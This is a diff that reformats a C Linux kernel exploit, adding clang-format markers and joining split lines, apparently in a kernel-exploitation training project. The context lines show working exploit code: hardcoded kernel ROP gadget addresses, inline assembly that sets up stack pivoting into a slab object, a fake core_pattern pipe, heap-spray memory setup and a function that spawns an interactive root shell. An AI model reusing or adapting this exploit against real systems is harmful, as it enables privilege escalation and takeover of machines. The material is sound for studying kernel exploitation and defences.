@@ -49,6 +49,7 @@
 #define STR_EXPAND(arg) #arg
 #define STR(arg) STR_EXPAND(arg)
 
+/* clang-format off */
 #define MMAP_SZ				(PAGE_SIZE * 2)
 #define PAYLOAD_SZ			95
 
@@ -72,6 +73,7 @@ static const char fake_core_pattern[] = "|/proc/%P/fd/777 %P";
 #define MOV_RAX_QWORD_PTR_RSI		0xffffffff812dcc30UL /* mov rax, qword ptr [rsi] ; ret */
 #define PUSH_RAX_POP_RSP_ADD_RSP_0X10	0xffffffff814d71faUL /* push rax ; pop rsp ; jmp 0xffffffff814d72ad
 								where 0xffffffff814d72ad contains: add rsp,0x10 ; ret */
+/* clang-format on */
 
 /* ========================================================================== */
 
@@ -96,11 +98,7 @@ int do_cpu_pinning(int cpu_n)
 void run_sh(void)
 {
 	pid_t pid = -1;
-	char *args[] = {
-		"/bin/sh",
-		"-i",
-		NULL
-	};
+	char *args[] = { "/bin/sh", "-i", NULL };
 	int status = 0;
 
 	pid = fork();
@@ -174,6 +172,7 @@ int act(int act_fd, int code, int n, char *args)
 	 * These gadgets calculate the address of the ROP chain #2 inside the
 	 * drill_item_t object (allocated in slab) and perform stack pivoting onto it.
 	 */
+	/* clang-format off */
 	__asm__ __volatile__(
 		".intel_syntax noprefix\n\t"
 		"mov r14, " STR(POP_RAX) "\n\t"
@@ -186,6 +185,7 @@ int act(int act_fd, int code, int n, char *args)
 		"mov r9, " STR(MOV_RAX_QWORD_PTR_RSI) "\n\t" /* put the drill_item_t address into rax */
 		"mov r8, " STR(PUSH_RAX_POP_RSP_ADD_RSP_0X10) "\n\t" /* do stack pivoting into drill_item_t.data */
 		".att_syntax prefix");
+	/* clang-format on */
 
 	/* Now perform the syscall with the crafted values in the registers */
 	bytes = write(act_fd, buf, len);
@@ -516,8 +516,7 @@ int main(int argc, char **argv)
 	 * Prepare
 	 */
 
-	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
-					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (spray_data == MAP_FAILED) {
 		perror("[-] mmap");
 		goto end;
